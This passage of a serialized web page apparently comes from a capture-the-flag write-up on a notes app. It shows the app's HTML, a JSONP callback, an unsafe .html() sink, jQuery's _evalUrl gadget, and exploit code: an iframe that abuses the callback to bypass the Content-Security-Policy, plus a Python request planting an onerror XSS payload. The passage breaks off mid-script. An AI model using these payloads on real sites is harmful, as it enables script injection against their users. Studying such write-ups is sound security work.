punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e/\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003eh2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003eContent\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003eh2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003einput\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eid\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003enoteContent\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ename\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003enoteContent\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eplaceholder\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003econtent\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003esize\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e50\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003einput\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003einput\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003etype\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003esubmit\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003evalue\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003ePost\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e/\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003eform\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ep\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eid\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003emessage\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ep\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003efooter\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003esrc\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e/index.js\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003efooter\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1e:T182d,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ehead\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003emeta\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ehttp-equiv\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003eContent-Security-Policy\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n        \u003cspan class=\"token attr-name\"\u003econtent\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003edefault-src 'none'; script-src 'self' https://code.jquery.com/jquery-3.7.1.js; connect-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003elink\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003erel\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003estylesheet\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ehref\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e/style.css\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003esrc\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003ehttps://code.jquery.com/jquery-3.7.1.js\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n        \u003cspan class=\"token attr-name\"\u003eintegrity\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003esha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ecrossorigin\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003eanonymous\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003cspan class=\"token language-javascript\"\u003e\n    \u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003esrc\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e/view.js\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ehead\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ebody\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003edefer\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003esrc\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e/api/view/\u0026lt;%= note %\u003e?callback=showNote\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ediv\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eid\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003enoteElement\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n        \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003eh1\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eid\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003enoteTitle\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003eh1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n        \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ep\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003eid\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003enoteContent\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ep\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n    \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ediv\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebody\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1f:T60e,\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function\"\u003eshowNote\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003enote\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    titleElement \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003e$\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"#noteTitle\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    contentElement \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003e$\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"#noteContent\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    titleElement\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003etext\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003enote\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"noteTitle\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    contentElement\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ehtml\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003enote\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"noteContent\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n20:Te3f,"])</script><script>self.__next_f.push([1,"jQuery\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function-variable function\"\u003e_evalUrl\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003eurl\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e options\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e doc\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e jQuery\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eajax\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003eurl\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e url\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n\n        \u003cspan class=\"token comment\"\u003e// Make this explicit, since user can override this through ajaxSetup (trac-11264)\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003etype\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"GET\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003edataType\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"script\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003ecache\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token boolean\"\u003etrue\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003easync\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token boolean\"\u003efalse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003eglobal\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token boolean\"\u003efalse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n\n        \u003cspan class=\"token comment\"\u003e// Only evaluate the response if it is successful (gh-4126)\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e// dataFilter is not invoked for failure responses, so using it instead\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e// of the default converter is kludgy but it works.\u003c/span\u003e\n        \u003cspan class=\"token literal-property property\"\u003econverters\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token string-property property\"\u003e\"text script\"\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"token function-variable function\"\u003edataFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e:\u003c/span\u003e \u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003eresponse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            jQuery\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eglobalEval\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresponse\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e options\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e doc\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"22:T4d9,\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003cspan class=\"token language-javascript\"\u003e\n    \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e iframe2 \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ecreateElement\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"iframe\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    iframe2\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esrc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ebody\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003eappendChild\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eiframe2\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n23:T44f,payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\u0026lt;img src=x onerror='alert(0)'\u003e\"\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e requests\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epost\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etarget \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"/api/post\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e json\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"noteContent\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"noteTitle\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"anything\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003cspan class=\"token pun"])</script><script>self.__next_f.push([1,"ctuation\"\u003e)\u003c/span\u003e\nnote_id \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e resp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ejson\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"id\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n24:Tefe,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003escript\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token script\"\u003e\u003cspan class=\"token language-javascript\"\u003e\n    \u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token function-variable function\"\u003esleep\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003ems\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"token class-name\"\u003ePromise\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token parameter\"\u003eresolve\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan 